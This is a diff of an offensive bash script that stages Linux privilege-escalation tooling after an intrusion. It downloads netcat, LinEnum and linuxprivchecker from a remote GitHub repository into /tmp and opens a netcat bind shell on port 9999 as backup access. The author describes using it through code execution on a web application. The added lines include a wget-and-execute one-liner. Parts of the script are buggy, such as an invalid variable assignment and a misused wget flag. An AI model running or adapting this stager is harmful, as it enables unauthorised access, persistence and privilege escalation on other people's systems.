@@ -1,5 +1,7 @@
 # used to stage all appropriate tools needed for privesc + handles some base config setup
-# download this file using: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh
+# use: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh && chmod +x linux_stager && ./linux_stager.sh 
+# (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
+
 
 $stage = /tmp
 
@@ -8,19 +10,18 @@ echo "[]---------------------------WillChaos Enum/Exploit stager----------------
 echo "[]_________________________________________________________________________________________[]"
 
 # download NC
-echo "[*] Downloadingf NC to: $stage + making executable"
+echo "[*] Downloading NC to: $stage + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
 chmod +x $stage/nc
 
 # download linenum.sh
-echo "[*] Downloadingf linenum.sh to: $stage + making executable"
+echo "[*] Downloading linenum.sh to: $stage + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
 chmod +x $stage/linenum.sh
 
 # download LinxPrivChecker.py
-echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
+echo "[*] Downloading LinuxPrivChecker.sh to: $stage + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
-chmod +x 
 
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
